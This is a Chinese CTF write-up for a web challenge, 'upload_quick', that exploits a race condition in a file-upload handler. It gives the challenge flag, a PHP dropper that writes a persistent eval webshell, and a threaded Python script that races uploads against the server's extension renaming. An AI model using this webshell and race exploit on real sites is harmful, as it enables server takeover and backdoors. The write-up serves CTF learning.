- **题目名称：** upload_quick
- **题目类型：** WEB
- **题目难度：** 中等
- **出题人：** fru1ts
- **考点：** 

1. 文件上传
2. 条件竞争

- **描述：** newnew的逻辑总是颠三倒四，令人困惑，milktea经常以飞快的速度在不经意间看到newnew的秘密
- **flag：** `XSCTF{fi1e_uplooooooooad_intetesting_491346}`
- **Writeup：** 

1.获取页面源码（3种方法）：

- `view-source:url` / Ctrl + U
- 打开开发者工具（不要用快捷键，已经锁死）
- burpsuit

在`EasePack.min.js`找到提示：`you find me, good luck for you! Now go to Upl00000000ad.php`

2.访问`/Upl00000000ad.php`进行文件上传。通过尝试发现文件成功传上去，然后非图片的后缀再被改成`.jpg`，所以可以通过条件竞争在被修改后缀前上传`websehll`。

思路：使用两个线程，一个线程上传php文件，另一个线程访问传上去的php使之执行。

为了留下稳定的后门，在上传的php里面写一个创建后门文件

```php
#a.php
<?php
fputs(fopen("shell.php","w"),'<?php @eval($_POST["cmd"]);?>');
?>
```

exp

```python
import requests
import threading

url = ''


def POST1():
    for i in range(50):
        filename = 'a.php'
        file = {"upload_file": open(filename, "rb")}
        r = requests.post(url=url + 'Upl00000000ad.php', data={'submit': 'True'}, files=file)

        # print(r.text)


def POST2():
    for i in range(50):
        r = requests.get(url=url + 'uploads/a.php')
        if r.status_code == 200:
            r=requests.get(url=url+'uploads/shell.php')
            if r.status_code==200:
                print('ok')
                break
        # print(r.text)



threading.Thread(target=POST1).start()
threading.Thread(target=POST2).start()


```

蚁剑连接`url/uploads/shell.php`

